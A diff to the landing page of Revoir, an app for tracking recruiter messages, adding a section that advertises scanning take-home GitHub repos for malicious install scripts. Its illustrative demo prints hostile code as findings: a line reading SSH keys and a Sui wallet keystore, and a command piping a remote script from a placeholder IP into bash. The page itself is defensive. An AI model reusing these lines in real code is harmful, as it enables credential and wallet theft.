@@ -442,6 +442,31 @@
   .finding.medium .sev { background: #fdf3d8; color: #a16207; }
   .finding .loc { margin-left: auto; font: 500 12.5px var(--mono); color: var(--check); text-decoration: none; }
   .finding pre { margin: 6px 0 0; background: #14181b; color: #e6e1f5; border-radius: 10px; padding: 9px 11px; font: 12.5px/1.5 var(--mono); white-space: pre-wrap; word-break: break-word; }
+  .hero-ctas { position: relative; display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+  .hero-ctas .pill:not(.dark) { gap: 9px; padding: 11px 20px; background: rgba(250,248,245,.08); }
+  .scan-pitch { display: grid; grid-template-columns: .9fr 1.1fr; gap: 34px; align-items: center; }
+  .scan-points { display: flex; flex-direction: column; gap: 20px; }
+  .scan-points > div { display: flex; gap: 14px; }
+  .scan-points .ic { flex: none; width: 32px; height: 32px; border-radius: 50%; background: var(--w-grad); color: #fff; display: inline-flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; }
+  .scan-points b { font-size: 17px; color: var(--w-cream); }
+  .scan-points p { margin: 4px 0 0; color: var(--w-grey2); font-size: 15px; }
+  .scan-points code, .scan-demo code { font-family: var(--mono); font-size: .92em; background: rgba(202,177,255,.16); padding: 1px 5px; border-radius: 5px; }
+  .scan-demo { background: #fff; color: #000; border-radius: 24px; padding: 24px; box-shadow: 0 30px 70px -30px rgba(94,14,255,.6); border: 1px solid #f2b8b5; }
+  .scan-demo code { background: #f3efe7; }
+  .sd-h { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+  .sd-badge { font-weight: 600; font-size: 12.5px; padding: 4px 10px; border-radius: 999px; background: #fde7e6; color: #b42318; }
+  .sd-c { font-size: 12.5px; color: #8e9294; }
+  .sd-sum { font-size: 14.5px; margin: 12px 0; color: #2b3035; }
+  .sd-run { background: #fff7f6; border-radius: 12px; padding: 10px 14px; font-size: 13.5px; }
+  .sd-run ul { margin: 6px 0 0; padding-left: 18px; }
+  .sd-t { font-size: 12.5px; color: #8e9294; }
+  .sd-f { display: flex; gap: 8px; align-items: baseline; margin-top: 14px; font-size: 14.5px; flex-wrap: wrap; }
+  .sd-f .sev { font-size: 11px; font-weight: 700; text-transform: uppercase; padding: 1px 7px; border-radius: 6px; background: #fde7e6; color: #b42318; }
+  .sd-f .loc { margin-left: auto; font-family: var(--mono); font-size: 12.5px; color: #1f6fd1; }
+  .scan-demo pre { margin: 6px 0 0; background: #14181b; color: #e6e1f5; border-radius: 10px; padding: 9px 11px; font: 12.5px/1.5 var(--mono); white-space: pre-wrap; word-break: break-word; }
+  .sd-next { margin-top: 14px; background: #e8f2fd; color: #0f3f7a; border-radius: 10px; padding: 10px 12px; font-size: 14px; }
+  .sd-cov { margin-top: 10px; font-size: 12px; color: #8e9294; }
+  @media (max-width: 980px) { .scan-pitch { grid-template-columns: 1fr; } }
 </style>
 </head>
 <body>
@@ -511,7 +536,7 @@ function renderLanding() {
   <div class="lp">
     <nav class="lp-nav">
       <a class="lp-brand" href="#">${MARK}Revoir</a>
-      <div class="lp-links"><a href="#how">How it works</a><a href="#features">Features</a><a href="#ownership">Ownership</a><a href="https://github.com/Nuel-osas/revior" target="_blank">GitHub</a></div>
+      <div class="lp-links"><a href="#scan">Repo scan</a><a href="#how">How it works</a><a href="#features">Features</a><a href="#ownership">Ownership</a><a href="https://github.com/Nuel-osas/revior" target="_blank">GitHub</a></div>
       <a class="pill" href="/auth/google/start">Sign in ${ARROW}</a>
     </nav>
 
@@ -520,8 +545,11 @@ function renderLanding() {
       ${err ? `<div class="lp-err">${esc(err)}</div><br/>` : ""}
       <span class="badge-pill"><span class="dots"><span style="background:#5e0eff">W</span><span style="background:#3395ee">S</span><span style="background:#14181b">J</span></span>Built on Walrus Memory · Sui mainnet</span>
       <h1>See every offer <span class="gem">${EYE}</span> again, before you say yes.</h1>
-      <p class="sub">Paste each message from a recruiter or collaborator as it arrives. Revoir remembers what they told you and shows exactly what changed, with sources, and what to check next.</p>
-      <a class="pill dark" href="/auth/google/start">Continue with Google ${ARROW}</a>
+      <p class="sub">Paste each message from a recruiter or collaborator as it arrives. Revoir remembers what they told you, shows exactly what changed, and scans any GitHub repo they ask you to run before it touches your machine.</p>
+      <div class="hero-ctas">
+        <a class="pill dark" href="/auth/google/start">Continue with Google ${ARROW}</a>
+        <a class="pill" href="#scan"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>Got a take-home repo? Scan it first</a>
+      </div>
 
       <div class="lp-mock">
         <div class="lp-app">
@@ -592,6 +620,31 @@ function renderLanding() {
       </div>
     </section>
 
+    <section class="lp-sec" id="scan">
+      <h2 class="two-tone"><span>"Clone our repo and run npm install."</span>Scan it before it runs you.</h2>
+      <p class="lede">Fake interviews increasingly hand developers a "take-home test" whose install script steals SSH keys, browser sessions and crypto wallets. Paste the GitHub link into Revoir. It downloads the code without running a single line, checks every file, and DeepSeek quotes the exact lines that would hurt you.</p>
+      <div class="scan-pitch">
+        <div class="scan-points">
+          <div><span class="ic">1</span><div><b>Nothing is executed.</b><p>Revoir reads the repo as text, straight from GitHub. Your machine never sees it.</p></div></div>
+          <div><span class="ic">2</span><div><b>What runs on install, in plain words.</b><p>postinstall hooks, VS Code tasks that fire when you open the folder, <code>curl | bash</code>.</p></div></div>
+          <div><span class="ic">3</span><div><b>Theft patterns, with evidence.</b><p>Reads of ~/.ssh, browser data and wallet keystores (Sui, Solana, MetaMask), env-var dumps, webhook exfiltration, obfuscated eval.</p></div></div>
+          <div><span class="ic">4</span><div><b>Every finding is quoted.</b><p>File, line and the exact code. If the evidence isn't really in the file, the finding is dropped.</p></div></div>
+          <a class="pill dark" href="/auth/google/start" style="align-self:flex-start;margin-top:6px">Scan a repo ${ARROW}</a>
+        </div>
+        <div class="scan-demo">
+          <div class="sd-h"><span class="sd-badge">Red flags found</span><b>acme-hiring/frontend-take-home</b><span class="sd-c">@ a91f3c2</span></div>
+          <p class="sd-sum">The setup script runs automatically on <code>npm install</code> and when the folder is opened in VS Code. It reads your SSH key and Sui wallet keystore and sends them to a Discord webhook.</p>
+          <div class="sd-run"><div class="sd-t">Runs automatically when you install or open it</div><ul><li><code>postinstall</code> → <code>node src/setup.js</code></li><li>VS Code task <code>runOn: folderOpen</code></li></ul></div>
+          <div class="sd-f"><span class="sev">high</span><b>Reads SSH key and Sui wallet keystore</b><span class="loc">src/setup.js:4</span></div>
+          <pre>const keys = [home + "/.ssh/id_rsa", home + "/.config/sui/sui_config/sui.keystore"]</pre>
+          <div class="sd-f"><span class="sev">high</span><b>Pipes a remote script into bash</b><span class="loc">src/setup.js:7</span></div>
+          <pre>execSync("curl -s http://203.0.113.7:8080/x.sh | bash")</pre>
+          <div class="sd-next">→ Don't run <code>npm install</code> or open it in VS Code. Inspect it only in a throwaway VM with no keys or wallets.</div>
+          <div class="sd-cov">4 files checked · nothing executed · illustrative example</div>
+        </div>
+      </div>
+    </section>
+
     <section class="lp-sec" id="how">
       <h2 class="two-tone"><span>Every message remembered.</span>Every change explained.</h2>
       <div class="duo">
@@ -637,7 +690,8 @@ function renderLanding() {
       <div class="faq">
         <div><h2>Frequently asked questions.</h2><p class="lede">What Revoir does, and just as importantly, what it doesn't.</p></div>
         <div>
-          <details open><summary>Will Revoir tell me if an offer is a scam?</summary><p>No. It never labels an offer safe or a scam. It shows what changed between messages, with quotes and sources, what is still unknown, and one independent check to make before you pay, sign or share anything.</p></details>
+          <details open><summary>Can Revoir check a repo they asked me to run?</summary><p>Yes. Paste the public GitHub link (or a message that contains it) and click Scan repo. Revoir downloads the code without running it, checks for install-time scripts, editor auto-run tasks, obfuscation and credential or wallet theft, and DeepSeek quotes the exact lines involved. It can't prove a repo is safe, so treat "no red flags found" as "nothing obvious in what was scanned", and still run unfamiliar code only in a throwaway environment.</p></details>
+          <details><summary>Will Revoir tell me if an offer is a scam?</summary><p>No. It never labels an offer safe or a scam. It shows what changed between messages, with quotes and sources, what is still unknown, and one independent check to make before you pay, sign or share anything.</p></details>
           <details><summary>Who can read my messages?</summary><p>The text you paste is processed by DeepSeek (reading and explaining), Jev by TypeSafe (comparing claims) and the Walrus Memory service, which encrypts it with Seal before storing it on Walrus. Please remove passwords, codes and ID numbers before pasting.</p></details>
           <details><summary>Why is memory on Walrus?</summary><p>So the record of what you were told outlives any one chat or device, and belongs to you. Each message is an encrypted blob owned by your wallet on Sui mainnet.</p></details>
           <details><summary>Do I pay anything?</summary><p>No. Revoir sponsors the small fees for creating your wallet and memory account, and the Walrus Memory service pays for storage.</p></details>
@@ -667,7 +721,7 @@ function renderLanding() {
 
     <footer class="foot2">
       <div><a class="lp-brand" href="#">${MARK}Revoir</a><p>Revoir is French for "to see again". Built on Walrus Memory and Sui for Walrus Sessions 8.</p></div>
-      <div><h6>Product</h6><a href="#features">Features</a><a href="#how">How it works</a><a href="#ownership">Ownership</a></div>
+      <div><h6>Product</h6><a href="#scan">Repo scan</a><a href="#features">Features</a><a href="#how">How it works</a><a href="#ownership">Ownership</a></div>
       <div><h6>Resources</h6><a href="#faq">FAQ</a><a href="https://github.com/Nuel-osas/revior" target="_blank">Source code</a><a href="https://docs.wal.app/walrus-memory" target="_blank">Walrus Memory</a></div>
       <div><h6>Account</h6><a href="/auth/google/start">Sign in</a><a href="/auth/google/start">Get started</a></div>
       <div class="legal">Not legal or financial advice. Revoir shows what changed in the messages you provide; it cannot verify who sent them.</div>
